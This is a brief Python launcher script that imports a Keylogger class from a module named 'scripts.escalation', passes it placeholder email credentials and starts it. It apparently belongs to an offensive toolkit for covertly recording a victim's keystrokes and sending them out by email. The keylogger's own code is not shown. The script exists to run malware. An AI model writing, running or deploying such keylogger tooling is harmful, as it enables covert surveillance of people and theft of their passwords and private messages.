#! /usr/bin/env python

from scripts.escalation import keylogger

email = "email@gmail.com"
password = "password"
keylogger = keylogger.Keylogger(email, password)
keylogger.start()
